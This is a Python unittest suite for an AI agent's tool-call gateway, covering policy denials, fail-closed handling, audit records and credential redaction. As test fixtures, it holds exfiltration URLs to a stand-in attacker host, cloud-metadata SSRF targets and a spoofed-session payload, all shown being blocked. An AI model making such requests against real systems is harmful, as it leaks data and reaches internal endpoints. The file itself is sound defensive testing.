"""Tests for the gateway service: policy wiring, audit ordering, redaction.

    python3 -m unittest discover -s gateway -t gateway -p 'test_*.py' -v

stdlib unittest, no network, no database. The OPA binary is real --
these exercise the subprocess decide flow against the shipped policy,
because a mocked policy engine proves the gate's code path and not the
boundary. Where OPA is unavailable the policy tests skip loudly rather
than pass quietly; the gate's own behaviour under a DEAD engine is
tested separately and never skips, since the fault shims ARE the subject
there.

What each class is for:

    BootProbes            fail closed at startup, naming what is missing
    ModeAgreement         M2-N4 -- one HARDENED grammar, a trustworthy /healthz
    Enrichment            the gateway establishes facts; policy decides
    PolicyDecisions       the real OPA, the real policy, both findings
    FaultInjection        D5.5 -- die, hang, garbage; all deny
    AuditOrdering         D4 -- the record is durable before execution
    WireContract          D5.1/D5.3 -- uniform denial, no reason leaked
    Redaction             MCP01 coverage AND the declared residual
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import audit as audit_mod  # noqa: E402
import decide as decide_mod  # noqa: E402
import gate as gate_mod  # noqa: E402
import mode as mode_mod  # noqa: E402
import redact as redact_mod  # noqa: E402

HERE = Path(__file__).resolve().parent
FAULTS = HERE / "test_faults"

# The policy lives in a hardened zone and is applied by a human. Until
# that lands, policy-dependent tests SKIP with the reason named -- they
# do not pass. A skipped test and a passing test say different things,
# and a suite that silently green-lights a missing policy is the exact
# failure this repo exists to argue against.
POLICY_DIR = Path(os.getenv("POLICY_DIR", HERE / "policy"))
POLICY_PRESENT = (POLICY_DIR / "policy.rego").exists() and (POLICY_DIR / "data.json").exists()
OPA = decide_mod.find_opa()

needs_policy = unittest.skipUnless(
    POLICY_PRESENT and OPA,
    f"needs an applied policy at {POLICY_DIR} and an opa binary "
    f"(policy={POLICY_PRESENT} opa={bool(OPA)})")


def schema_path() -> Path:
    """The redaction schema, from the policy dir or the Go copy.

    app/redact/redact.json is a byte-identical copy guarded by a drift
    test, so reading it when the hardened zone is not yet applied tests
    the same bytes rather than inventing a second schema.
    """
    applied = POLICY_DIR / "redact.json"
    if applied.exists():
        return applied
    return HERE.parent / "app" / "redact" / "redact.json"


# The authority every gate test runs under unless it says otherwise: the
# acting session's row, with every leg passing (plan M3 T6 D3). The gate asks the
# API for this before it decides; the tests answer for the API, so they stay
# offline, and a test about one leg changes only that leg.
ACME = "0a000000-0000-4000-8000-000000000001"  # the seed's fixed id (plan M3 T6 D6)

PASSING_AUTHORITY = {
    "session": {"id": "s-1", "org": ACME, "acting_for": "u-1"},
    "role_now": "member",
    "legs": {"within_time": True, "in_scope": True, "role_permits": True},
}


def authority_answering(answer=PASSING_AUTHORITY, err=""):
    calls = []

    def fake(session_id, tool):
        calls.append((session_id, tool))
        return (None, err) if err else (json.loads(json.dumps(answer)), "")
    fake.calls = calls
    return fake


def make_config(tmp, *, opa_path=None, opa_timeout=5.0, authority=None):
    schema = redact_mod.Schema.load(schema_path())
    audit = audit_mod.Audit.open(Path(tmp) / "audit" / "gateway.jsonl", schema)
    policy_data = {}
    data_file = POLICY_DIR / "data.json"
    if data_file.exists():
        policy_data = json.loads(data_file.read_text())
    return gate_mod.Config(
        policy_dir=POLICY_DIR,
        policy_data=policy_data,
        schema=schema,
        audit=audit,
        api_base="http://api:8080",
        tools_secret="test-secret",
        opa_path=opa_path or OPA,
        opa_timeout=opa_timeout,
        authority_lookup=authority or authority_answering(),
    )


def fetch_payload(url, derived_from=("user",)):
    return {
        "tool": "http_fetch",
        "args": {"url": url},
        "session": {"id": "s-1"},
        "provenance": {"derived_from": list(derived_from)},
    }


def read_lines(path):
    return [json.loads(line) for line in Path(path).read_text().splitlines() if line.strip()]


class BootProbes(unittest.TestCase):
    """Fail closed at startup, loudly, naming what is wrong (D5.5)."""

    def test_missing_policy_refuses_to_start(self):
        with tempfile.TemporaryDirectory() as tmp, \
                mock.patch.dict(os.environ, {"TOOLS_SECRET": "x", "HARDENED": "false"}):
            empty = Path(tmp) / "no-policy"
            empty.mkdir()
            with self.assertRaises(SystemExit) as ctx:
                gate_mod.boot(policy_dir=empty, audit_path=Path(tmp) / "a.jsonl")
            self.assertIn("no policy at", str(ctx.exception))

    def test_missing_tools_secret_refuses_to_start_when_hardened(self):
        # T6 D3: the secret is required in HARDENED mode, mirroring the
        # API's loadToolsSecret -- vulnerable mode has no internal route
        # to authenticate to, and `make up` must boot with no secrets.
        with tempfile.TemporaryDirectory() as tmp, \
                mock.patch.dict(os.environ, {"HARDENED": "true"}):
            os.environ.pop("TOOLS_SECRET", None)
            with self.assertRaises(SystemExit) as ctx:
                gate_mod.boot(policy_dir=POLICY_DIR, audit_path=Path(tmp) / "a.jsonl")
            # D5b: an unset shared secret is a startup failure, never a
            # runtime 401 that surfaces as a missing document.
            self.assertIn("TOOLS_SECRET", str(ctx.exception))

    def test_tools_secret_is_not_demanded_in_vulnerable_mode(self):
        with tempfile.TemporaryDirectory() as tmp, \
                mock.patch.dict(os.environ, {"HARDENED": "false"}):
            os.environ.pop("TOOLS_SECRET", None)
            try:
                gate_mod.boot(policy_dir=POLICY_DIR, audit_path=Path(tmp) / "a.jsonl")
            except SystemExit as exc:
                # Boot may still refuse for OTHER reasons (no applied
                # policy yet) -- but never for the secret.
                self.assertNotIn("TOOLS_SECRET", str(exc))

    def test_an_unparseable_mode_refuses_to_start(self):
        with tempfile.TemporaryDirectory() as tmp, \
                mock.patch.dict(os.environ, {"HARDENED": "ture", "TOOLS_SECRET": "x"}):
            with self.assertRaises(SystemExit) as ctx:
                gate_mod.boot(policy_dir=POLICY_DIR, audit_path=Path(tmp) / "a.jsonl")
            self.assertIn("HARDENED", str(ctx.exception))
            self.assertIn("ture", str(ctx.exception))


class ModeAgreement(unittest.TestCase):
    """M2-N4: one grammar for HARDENED, and a health body the API can trust."""

    def test_parse_matches_the_shared_vectors(self):
        # The same file app/mode/mode_test.go reads. A missing file
        # fails: an absent contract must not read as agreement.
        doc = json.loads((HERE / "mode_vectors.json").read_text(encoding="utf-8"))
        self.assertTrue(doc["vectors"], "a contract with no cases asserts nothing")
        for v in doc["vectors"]:
            with self.subTest(raw=v["raw"]):
                if v["want"] == "error":
                    with self.assertRaises(ValueError):
                        mode_mod.parse(v["raw"])
                else:
                    self.assertIs(mode_mod.parse(v["raw"]), v["want"])

    def test_healthz_reports_a_boolean_mode(self):
        # The API's probe accepts ONLY {"status":"ok","hardened":<bool>};
        # T5's {"mode":"<raw env string>"} is refused by design.
        with tempfile.TemporaryDirectory() as tmp:
            for hardened in (True, False):
                cfg = make_config(tmp)
                cfg.hardened = hardened
                body = gate_mod.healthz_body(cfg)
                self.assertEqual(body, {"status": "ok", "hardened": hardened})
                self.assertIs(type(body["hardened"]), bool)


class Enrichment(unittest.TestCase):
    """The gateway establishes the facts; the policy never resolves."""

    def test_resolution_happens_in_the_gateway(self):
        resolved, err = gate_mod.enrich("http_fetch", {"url": "http://127.0.0.1/a"})
        self.assertEqual(err, "")
        self.assertEqual(resolved["host"], "127.0.0.1")
        self.assertEqual(resolved["ip"], "127.0.0.1")
        # Classified by ipaddress parsing, never by string match.
        self.assertTrue(resolved["denied_range"])

    def test_read_document_has_nothing_to_resolve(self):
        resolved, err = gate_mod.enrich("read_document", {"id": "d1"})
        self.assertEqual((resolved, err), ({}, ""))

    def test_an_unresolvable_host_is_reported_not_raised(self):
        resolved, err = gate_mod.enrich(
            "http_fetch", {"url": "http://no-such-host.invalid/a"})
        self.assertIn("could not resolve", err)
        self.assertEqual(resolved["host"], "no-such-host.invalid")


@needs_policy
class PolicyDecisions(unittest.TestCase):
    """The real OPA, the real shipped policy, both M2 findings."""

    def decide(self, payload, resolved):
        # The input the gate builds: the ROW's session and the authority
        # legs (plan M3 T6 D3), every leg passing, so M2's findings die at the
        # egress legs exactly as before.
        return decide_mod.decide(
            {
                "tool": payload["tool"],
                "args": payload["args"],
                "session": PASSING_AUTHORITY["session"],
                "provenance": payload["provenance"],
                "resolved": resolved,
                "authority": {"role_now": PASSING_AUTHORITY["role_now"],
                              "legs": PASSING_AUTHORITY["legs"]},
            },
            policy_dir=str(POLICY_DIR), opa_path=OPA)

    def test_finding_03_dies_at_the_allowlist(self):
        # The attacker fixture also sits in a denied range, so this is
        # the ordering assertion: ONE reason, and it is the allowlist.
        d = self.decide(
            fetch_payload("http://attacker.example/collect?data=x", ("user", "untrusted")),
            {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": True})
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, ["egress_not_allowlisted"])

    def test_finding_04_dies_at_the_range(self):
        d = self.decide(
            fetch_payload("http://metadata.google.internal/computeMetadata/v1/"),
            {"host": "metadata.google.internal", "ip": "169.254.169.254",
             "denied_range": True})
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, ["resolved_address_denied"])

    def test_a_clean_call_is_allowed(self):
        d = self.decide(
            fetch_payload("http://docs.example/a"),
            {"host": "docs.example", "ip": "93.184.216.34", "denied_range": False})
        self.assertEqual(d.route, "allow")

    def test_finding_06_dies_at_delegability(self):
        # Plan M3 T7: an ADMIN's session, every authority leg passing --
        # the role leg allows set_member_role, because an admin may change
        # roles directly. The denial is the non-delegable denylist's alone.
        d = decide_mod.decide(
            {
                "tool": "set_member_role",
                "args": {"user": "u-2", "role": "admin"},
                "session": PASSING_AUTHORITY["session"],
                "provenance": {"derived_from": ["user", "untrusted"]},
                "resolved": {},
                "authority": {"role_now": "admin", "legs": PASSING_AUTHORITY["legs"]},
            },
            policy_dir=str(POLICY_DIR), opa_path=OPA)
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, ["control_plane_not_delegable"])

    def test_empty_input_is_denied(self):
        # The regression for the fail-open the first draft shipped: an
        # undefined input.tool made every leg undefined, violations
        # empty, and the decision ALLOW. Reading the policy did not
        # reveal it; this did.
        d = decide_mod.decide({}, policy_dir=str(POLICY_DIR), opa_path=OPA)
        self.assertEqual(d.route, "deny")


class FaultInjection(unittest.TestCase):
    """D5.5: fail closed is VERIFIED by breaking the dependency.

    Never skipped. The subject here is the gate's behaviour when the
    policy engine is dead, which needs no policy of its own.
    """

    def decide_with(self, shim, timeout=5.0):
        return decide_mod.decide(
            {"tool": "http_fetch", "args": {}, "session": {}, "provenance": {}},
            policy_dir=str(POLICY_DIR), opa_path=str(FAULTS / shim),
            timeout=timeout)

    def test_a_dead_engine_denies(self):
        d = self.decide_with("opa-die")
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, [decide_mod.OPA_UNAVAILABLE])

    def test_a_hung_engine_denies_within_the_timeout(self):
        # The wall clock is the assertion. A gate that waits forever is a
        # denial-of-service, not a control.
        start = time.monotonic()
        d = self.decide_with("opa-hang", timeout=1.0)
        elapsed = time.monotonic() - start
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, [decide_mod.OPA_UNAVAILABLE])
        self.assertLess(elapsed, 5.0, "the gate did not bound its own wait")

    def test_a_lying_engine_denies(self):
        # Exit 0 with unusable output: the case that defeats a gate which
        # checks only the return code.
        d = self.decide_with("opa-garbage")
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, [decide_mod.OPA_UNAVAILABLE])

    def test_a_missing_binary_denies(self):
        d = decide_mod.decide(
            {"tool": "http_fetch"}, policy_dir=str(POLICY_DIR),
            opa_path="/nonexistent/opa")
        self.assertEqual(d.route, "deny")
        self.assertEqual(d.reasons, [decide_mod.OPA_UNAVAILABLE])

    def test_no_failure_mode_raises(self):
        # Every path out of decide() is a route. A caller cannot
        # accidentally proceed past a failure, because there is no
        # exception to swallow and no None to misread.
        for shim in ("opa-die", "opa-garbage"):
            with self.subTest(shim=shim):
                d = self.decide_with(shim)
                self.assertIsInstance(d, decide_mod.Decision)
                self.assertFalse(d.allowed)


class AuditOrdering(unittest.TestCase):
    """D4: the record is durable BEFORE execution, and the id after it."""

    def test_the_id_is_returned_only_after_the_record_lands(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp)
            decision_id = cfg.audit.pre(
                tool="http_fetch", args={"url": "http://attacker.example/x"},
                session={"id": "s-1", "org": "acme", "acting_for": "u-1"},
                provenance={"derived_from": ["user", "untrusted"]},
                resolved={"host": "attacker.example", "ip": "172.20.0.9",
                          "denied_range": True},
                route="deny", reasons=["egress_not_allowlisted"])

            records = read_lines(cfg.audit.path)
            self.assertEqual(len(records), 1)
            rec = records[0]
            self.assertEqual(rec["decision_id"], decision_id)
            self.assertTrue(decision_id.startswith("d_"),
                            "gateway-minted ids are d_-prefixed")
            self.assertEqual(rec["phase"], "pre")
            # SR-B5-9: logged WITH ITS INPUTS. Without the enrichment the
            # record cannot say what resolved where, which is the whole
            # evidence of an SSRF attempt.
            self.assertEqual(rec["resolved"]["ip"], "172.20.0.9")
            self.assertEqual(rec["provenance"]["derived_from"], ["user", "untrusted"])
            # SR-B3-9: attribution on every record.
            self.assertEqual(rec["acting_for"], "u-1")
            self.assertEqual(rec["org"], "acme")
            # The reasons live HERE and nowhere the agent can read.
            self.assertEqual(rec["reasons"], ["egress_not_allowlisted"])

    def test_post_joins_to_pre(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp)
            did = cfg.audit.pre(
                tool="read_document", args={"id": "d1"},
                session={"id": "s", "org": "o", "acting_for": "u"},
                provenance={"derived_from": ["user"]}, resolved={},
                route="allow", reasons=["policy_satisfied"])
            cfg.audit.post(did, outcome="ok", summary="doc (12 bytes)", duration_ms=14)

            pre, post = read_lines(cfg.audit.path)
            self.assertEqual(post["decision_id"], pre["decision_id"])
            self.assertEqual(post["phase"], "post")
            # The post record is LEAN: no result bodies. Tenant data is
            # stored once, in messages.
            self.assertNotIn("text", post)
            self.assertNotIn("body", post)

    def test_an_unwritable_audit_path_fails_at_open(self):
        with tempfile.TemporaryDirectory() as tmp:
            blocker = Path(tmp) / "blocker"
            blocker.write_text("x")
            schema = redact_mod.Schema.load(schema_path())
            with self.assertRaises(OSError):
                audit_mod.Audit.open(blocker / "nested" / "gateway.jsonl", schema)


class WireContract(unittest.TestCase):
    """D5.1 as amended by D5.3: a decision is 200, a denial is uniform.

    These use an IP LITERAL rather than a fixture hostname on purpose.
    attacker.example and docs.example only resolve inside the Compose
    network (T6's extra_hosts), so a hostname here would make the test
    depend on DNS that does not exist in a clean clone -- it would deny
    for `enrichment_failed` instead of the reason under test, and the
    assertion would be measuring the wrong leg. An IP literal needs no
    resolver, so the gate reaches the policy engine every time and these
    stay keyless, offline and deterministic (the Tier 1 promise).
    """

    def test_a_denial_leaks_no_reason(self):
        with tempfile.TemporaryDirectory() as tmp:
            # The engine is dead, so the gate denies for opa_unavailable
            # -- which makes this the sharpest version of the test: even
            # an INTERNAL failure reason must not reach the caller.
            cfg = make_config(tmp, opa_path=str(FAULTS / "opa-die"))
            status, body = gate_mod.handle_gate(
                cfg, fetch_payload("http://127.0.0.1/collect?data=x",
                                   ("user", "untrusted")))

            self.assertEqual(status, 200, "a deny is the gate working, not a transport error")
            self.assertEqual(body["route"], "deny")
            self.assertEqual(body["text"], gate_mod.DENIED_TEXT)
            self.assertNotIn("reason", body)
            self.assertNotIn("detail", body)
            blob = json.dumps(body)
            for leaked in ("opa_unavailable", "egress_not_allowlisted",
                           "resolved_address_denied", "allowlist"):
                self.assertNotIn(leaked, blob,
                                 f"{leaked!r} on the wire is an existence oracle (B7 2.2)")

            # And the reason IS in the record, where the PoCs read it.
            rec = read_lines(cfg.audit.path)[0]
            self.assertEqual(rec["reasons"], [decide_mod.OPA_UNAVAILABLE])
            self.assertEqual(rec["decision_id"], body["decision_id"])

    def test_a_denied_call_executes_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp, opa_path=str(FAULTS / "opa-die"))
            executed = []
            original = gate_mod.execute
            gate_mod.execute = lambda *a, **k: executed.append(a) or ("ok", "", "")
            try:
                gate_mod.handle_gate(cfg, fetch_payload("http://127.0.0.1/a"))
            finally:
                gate_mod.execute = original
            self.assertEqual(executed, [], "a denied call must not reach the executor")
            # Exactly one record: the pre. There is no completion record
            # for something that never ran.
            self.assertEqual(len(read_lines(cfg.audit.path)), 1)

    def test_an_unreachable_audit_refuses_rather_than_denies(self):
        # No record, no execution (SR-B5-6) -- but reported as 5xx, not
        # as a deny. The harness must see an OPERATIONAL failure (exit 2)
        # and never mistake a broken gate for a control holding.
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp, opa_path=str(FAULTS / "opa-die"))
            cfg.audit.path.unlink()
            cfg.audit.path.mkdir()
            status, body = gate_mod.handle_gate(cfg, fetch_payload("http://127.0.0.1/a"))
            self.assertGreaterEqual(status, 500)
            self.assertNotIn("route", body)


class AuthorityWiring(unittest.TestCase):
    """Plan M3 T6 D3: the gate decides on the session ROW, never the payload."""

    def capture_decide(self):
        seen = {}
        original = decide_mod.decide

        def fake(inp, **_kw):
            seen["input"] = inp
            return decide_mod.Decision("allow", ["policy_satisfied"])
        decide_mod.decide = fake
        self.addCleanup(setattr, decide_mod, "decide", original)
        return seen

    def stub_execute(self):
        calls = []
        original = gate_mod.execute
        gate_mod.execute = lambda cfg, tool, args, session: calls.append((tool, session)) or ("ok", "t", "s")
        self.addCleanup(setattr, gate_mod, "execute", original)
        return calls

    def test_the_payloads_org_and_acting_user_are_ignored(self):
        with tempfile.TemporaryDirectory() as tmp:
            lookup = authority_answering()
            cfg = make_config(tmp, authority=lookup)
            seen = self.capture_decide()
            calls = self.stub_execute()
            payload = {"tool": "read_document", "args": {"id": "d1"},
                       "session": {"id": "s-1", "org": "globex", "acting_for": "u-attacker"},
                       "provenance": {"derived_from": ["user"]}}
            status, body = gate_mod.handle_gate(cfg, payload)

            self.assertEqual((status, body["route"]), (200, "allow"))
            self.assertEqual(lookup.calls, [("s-1", "read_document")])
            # The policy sees the ROW's session and the authority legs.
            self.assertEqual(seen["input"]["session"], PASSING_AUTHORITY["session"])
            self.assertEqual(seen["input"]["authority"]["legs"], PASSING_AUTHORITY["legs"])
            # The record attributes the call to the row's org and user.
            rec = read_lines(cfg.audit.path)[0]
            self.assertEqual((rec["session"], rec["org"], rec["acting_for"]), ("s-1", ACME, "u-1"))
            # And execution runs in the row's session, not the payload's.
            self.assertEqual(calls, [("read_document", PASSING_AUTHORITY["session"])])

    def test_the_pre_record_carries_the_authority_the_decision_used(self):
        # SR-B3-9: the role read AT ACTION TIME and every leg are in the
        # record. 05 (ii) reads the demotion from here (m3-delegation.md D5).
        with tempfile.TemporaryDirectory() as tmp:
            demoted = json.loads(json.dumps(PASSING_AUTHORITY))
            demoted["role_now"] = "viewer"
            demoted["legs"]["role_permits"] = False
            cfg = make_config(tmp, authority=authority_answering(demoted))
            self.capture_decide()
            self.stub_execute()
            gate_mod.handle_gate(cfg, {"tool": "delete_document", "args": {"id": "d1"},
                                       "session": {"id": "s-1"}, "provenance": {"derived_from": ["user"]}})
            rec = read_lines(cfg.audit.path)[0]
            self.assertEqual(rec["authority"], {"role_now": "viewer", "legs": demoted["legs"]})

    def test_an_unnamed_tool_reaches_the_policy_unasked(self):
        # M2's reason for an unnamed tool is unknown_tool. Asking the
        # authority route about "" would turn it into enrichment_failed.
        with tempfile.TemporaryDirectory() as tmp:
            lookup = authority_answering()
            cfg = make_config(tmp, authority=lookup)
            seen = self.capture_decide()
            gate_mod.handle_gate(cfg, {"tool": "", "args": {}, "session": {"id": "s-1"},
                                       "provenance": {"derived_from": ["user"]}})
            self.assertEqual(lookup.calls, [])
            self.assertEqual(seen["input"]["authority"], {}, "no legs, so every leg reads as failing")

    def test_a_lookup_that_answers_nothing_fails_closed(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp, authority=lambda sid, tool: (None, ""))
            calls = self.stub_execute()
            status, body = gate_mod.handle_gate(cfg, {"tool": "read_document", "args": {"id": "d1"},
                                                      "session": {"id": "s-1"}, "provenance": {"derived_from": ["user"]}})
            self.assertEqual((status, body["route"], calls), (200, "deny", []))
            self.assertEqual(read_lines(cfg.audit.path)[0]["reasons"], ["enrichment_failed"])

    def test_a_refusal_at_execution_is_its_own_outcome(self):
        # M3-N2: the gate allowed it, the API's re-check refused it. The
        # completion record says so as an OUTCOME, with the leg as summary.
        from tools import documents
        original = documents.delete_document
        documents.delete_document = lambda i, s, **k: documents.DocumentResult(
            False, reason=documents.REFUSED_AT_EXECUTION, detail="role_does_not_permit")
        self.addCleanup(setattr, documents, "delete_document", original)
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp)
            self.capture_decide()
            status, body = gate_mod.handle_gate(cfg, {"tool": "delete_document", "args": {"id": "d1"},
                                                      "session": {"id": "s-1"}, "provenance": {"derived_from": ["user"]}})
            self.assertEqual(body["route"], "deny")
            self.assertEqual(body["text"], gate_mod.DENIED_TEXT, "the agent learns nothing more")
            post = read_lines(cfg.audit.path)[1]
            self.assertEqual((post["outcome"], post["summary"]),
                             ("refused_at_execution", "role_does_not_permit"))

    def test_no_authority_means_deny_enrichment_failed_and_nothing_runs(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp, authority=authority_answering(err="no such session 's-9'"))
            calls = self.stub_execute()
            status, body = gate_mod.handle_gate(cfg, {
                "tool": "delete_document", "args": {"id": "d1"},
                "session": {"id": "s-9", "org": "acme", "acting_for": "u-1"},
                "provenance": {"derived_from": ["user"]}})
            self.assertEqual((status, body["route"]), (200, "deny"))
            self.assertEqual(calls, [])
            rec = read_lines(cfg.audit.path)[0]
            self.assertEqual(rec["reasons"], ["enrichment_failed"])
            # Attribution only from facts the gate established: the id the
            # call named, and NOT the org the payload claimed.
            self.assertEqual((rec["session"], rec["org"], rec["acting_for"]), ("s-9", "", ""))

    def test_a_payload_without_a_session_id_is_denied_without_asking(self):
        with tempfile.TemporaryDirectory() as tmp:
            lookup = authority_answering()
            cfg = make_config(tmp, authority=lookup)
            status, body = gate_mod.handle_gate(cfg, {
                "tool": "read_document", "args": {"id": "d1"}, "session": {},
                "provenance": {"derived_from": ["user"]}})
            self.assertEqual(body["route"], "deny")
            self.assertEqual(read_lines(cfg.audit.path)[0]["reasons"], ["enrichment_failed"])
            self.assertEqual(lookup.calls, [], "no session id, so nothing to ask")

    def test_the_write_tools_execute_through_the_session(self):
        # execute() routes each document tool to its client with the ROW's
        # session id; set_member_role has no route at all (D6).
        from tools import documents
        seen = []
        originals = {n: getattr(documents, n) for n in ("read_document", "update_document", "delete_document")}
        documents.update_document = lambda i, b, s, **k: seen.append(("update", i, b, s)) or documents.DocumentResult(True, document_id=i)
        documents.delete_document = lambda i, s, **k: seen.append(("delete", i, s)) or documents.DocumentResult(True, document_id=i)
        documents.read_document = lambda i, s, **k: seen.append(("read", i, s)) or documents.DocumentResult(True, document_id=i, title="t", body="b")
        for n, f in originals.items():
            self.addCleanup(setattr, documents, n, f)
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp)
            sess = PASSING_AUTHORITY["session"]
            self.assertEqual(gate_mod.execute(cfg, "update_document", {"id": "d1", "body": "x"}, sess)[0], "ok")
            self.assertEqual(gate_mod.execute(cfg, "delete_document", {"id": "d1"}, sess)[0], "ok")
            self.assertEqual(gate_mod.execute(cfg, "read_document", {"id": "d1"}, sess)[0], "ok")
            outcome, _, summary = gate_mod.execute(cfg, "set_member_role", {"user": "u", "role": "admin"}, sess)
            self.assertEqual((outcome, summary), ("error", "unroutable"))
        self.assertEqual(seen, [("update", "d1", "x", "s-1"), ("delete", "d1", "s-1"), ("read", "d1", "s-1")])

    def test_an_allowed_set_member_role_still_cannot_execute(self):
        # Plan M3 T7, the STRUCTURAL half of D6: suppose the policy were
        # wrong and allowed it. The gate still has no route to execute a
        # control-plane action -- no client is called, nothing reaches the
        # API -- and the post-record says so. Policy denies it; structure
        # makes the denial not the only thing standing in the way.
        import importlib
        import pkgutil
        import re
        import tools
        from tools import documents
        # No client for any non-delegable tool, in ANY tools module -- the
        # list read from the policy itself, so M4b's additions are covered
        # without an edit here (and no second copy of the list exists).
        rego = (POLICY_DIR / "policy.rego").read_text()
        denylist = re.findall(r'"([^"]+)"', re.search(r"(?m)^non_delegable := \{([^}]*)\}", rego).group(1))
        self.assertIn("set_member_role", denylist)
        for info in pkgutil.iter_modules(tools.__path__):
            if info.name.startswith("test_"):
                continue
            module = importlib.import_module(f"tools.{info.name}")
            for tool in denylist:
                self.assertFalse(hasattr(module, tool), f"tools.{info.name} has a client for {tool}, a control-plane tool")
        reached = []
        original = documents.call_internal
        documents.call_internal = lambda *a, **k: reached.append(a) or (200, "{}")
        self.addCleanup(setattr, documents, "call_internal", original)
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp)
            self.capture_decide()
            status, body = gate_mod.handle_gate(cfg, {
                "tool": "set_member_role", "args": {"user": "u-2", "role": "admin"},
                "session": {"id": "s-1"}, "provenance": {"derived_from": ["user"]}})
            self.assertNotEqual(body.get("route"), "allow")
            pre, post = read_lines(cfg.audit.path)
            self.assertEqual(pre["route"], "allow", "the test's premise: the policy was bypassed")
            self.assertEqual((post["outcome"], post["summary"]), ("error", "unroutable"))
        self.assertEqual(reached, [], "nothing may reach the API for a control-plane tool")

    def test_an_update_with_no_body_is_refused_before_the_api(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp)
            outcome, _, summary = gate_mod.execute(cfg, "update_document", {"id": "d1"}, PASSING_AUTHORITY["session"])
            self.assertEqual(outcome, "error")
            self.assertIn("body", summary)


class Redaction(unittest.TestCase):
    """MCP01: a control with a regression test, and a pinned residual."""

    def setUp(self):
        self.schema = redact_mod.Schema.load(schema_path())

    def test_credential_named_fields_are_redacted_at_any_depth(self):
        out = self.schema.fields({
            "session_token": "tok-TESTVALUE-0001",
            "nested": {"api_key": "tok-TESTVALUE-0002",
                       "deeper": [{"client_secret": "tok-TESTVALUE-0003"}]},
            "password": "tok-TESTVALUE-0004",
        })
        self.assertEqual(out["session_token"], redact_mod.REDACTED)
        self.assertEqual(out["nested"]["api_key"], redact_mod.REDACTED)
        self.assertEqual(out["nested"]["deeper"][0]["client_secret"], redact_mod.REDACTED)
        self.assertEqual(out["password"], redact_mod.REDACTED)

    def test_what_detection_needs_survives(self):
        # If any of these are ever redacted, T9 goes blind and D5.2's
        # detection-visibility requirement is broken by a schema edit.
        args = {"url": "http://attacker.example/collect?data=x",
                "host": "metadata.google.internal", "ip": "169.254.169.254",
                "id": "4db02253-bccf-4cd0-a513-ae84ea18ead4"}
        self.assertEqual(self.schema.fields(args), args)

    def test_the_residual_is_pinned(self):
        # The DECLARED gap, asserted as known: redaction is by field
        # name, never by value shape, so a token inside a URL query value
        # SURVIVES. A change that starts mangling URLs must fail here and
        # force a conscious re-declaration.
        url = "http://collector.example/c?token=tok-TESTVALUE-0005&data=bytes"
        self.assertEqual(self.schema.fields({"url": url})["url"], url)

    def test_the_schema_declares_its_residual(self):
        raw = json.loads(schema_path().read_text())
        self.assertIn("_residual", raw,
                      "a schema without a declared residual implies a coverage it does not have")

    def test_no_credential_reaches_the_audit_store(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = make_config(tmp, opa_path=str(FAULTS / "opa-die"))
            payload = fetch_payload("http://127.0.0.1/a")
            payload["args"]["session_token"] = "tok-TESTVALUE-0006"
            gate_mod.handle_gate(cfg, payload)
            blob = cfg.audit.path.read_text()
            self.assertNotIn("tok-TESTVALUE-0006", blob)
            self.assertIn(redact_mod.REDACTED, blob)


class GoSchemaParity(unittest.TestCase):
    """The two languages must redact against identical bytes (D5.4)."""

    def test_the_go_copy_matches_the_applied_schema(self):
        applied = POLICY_DIR / "redact.json"
        if not applied.exists():
            self.skipTest(f"the hardened-zone schema is not applied yet ({applied})")
        go_copy = HERE.parent / "app" / "redact" / "redact.json"
        self.assertEqual(applied.read_bytes(), go_copy.read_bytes(),
                         "drift: regenerate with "
                         "cp gateway/policy/redact.json app/redact/redact.json")


if __name__ == "__main__":
    unittest.main()
